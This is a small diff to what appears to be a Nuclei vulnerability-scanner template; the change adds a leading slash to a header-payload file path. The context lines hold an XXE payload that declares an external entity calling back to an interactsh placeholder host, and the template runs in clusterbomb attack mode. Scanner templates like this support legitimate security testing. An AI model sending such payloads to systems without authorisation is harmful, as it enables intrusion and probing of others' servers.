@@ -35,7 +35,7 @@ requests:
         < ! DOCTYPE foo [<!ENTITY % xxe SYSTEM "{{interactsh-url}}"> %xxe; ] >
     
     payloads:
-      header: nuclei-templates/helpers/payloads/request-headers.txt   
+      header: /nuclei-templates/helpers/payloads/request-headers.txt   
     
     attack: clusterbomb
     redirects: true
